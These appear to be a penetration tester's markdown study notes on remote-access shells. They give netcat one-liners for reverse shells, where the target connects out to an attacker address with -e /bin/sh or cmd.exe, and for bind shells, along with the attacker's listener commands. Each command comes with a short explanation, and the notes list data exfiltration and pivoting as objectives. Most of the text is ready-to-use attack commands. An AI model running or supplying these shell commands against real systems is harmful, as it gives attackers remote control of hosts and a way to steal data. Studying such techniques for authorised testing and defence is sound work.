## Quick-Use

**Commands**:
- `netcat`
    - REVERSE SHELL: **Hacker <--- Target**
        - *Listener* -- `nc -lvp 4444` - Attacker's setup, `-lvp` means "listening, verbose, port". So this says to "listen for a process connection on port 4444"
        - *Connector* -- *Linux*: `nc ATTKRIPADDR 4444 -e /bin/sh` | *Win*: `nc ATTKRIPADDR 4444 -e cmd.exe` - Target's setup, `-e` means establish. So this says "connect to the IP address at port 4444 and establish a running `/bin/sh` process (`shell`)"
    - BIND SHELL: **Hacker ---> Target**
        - *Connector* -- `nc TRGTIPADDR 4444` - Attacker's setup. This says to "request a connection to the IP address at port 4444 and accept the service they establish"
        - *Listener* -- *Linux*: `nc -lvp 4444 -e /bin/sh` | *Win*: `nc -lvp 4444 -e cmd.exe` - Target's setup, `-e` means establish. So this says "listen to port 4444 and establish a running `/bin/sh` process (`shell`) when a connection is established"

*Tools*:
- `netcat` - CLI - (in this context) usually used to gain a reverse shell

## General

**Objectives**: Establish a connection on target to allow shell executable commands. Can exfiltrate data, gain more enumeration on target, or pivot to higher value.

**Overview**:
There are two main types of remote access shells:
- Reverse Shells - most common shell (95% of the time according to Heath) - victim connects to attacker (**Hacker <--- Target**)
- Binding Shells - More common on External assessments - Attacker connects to target (**Hacker ---> Target**)
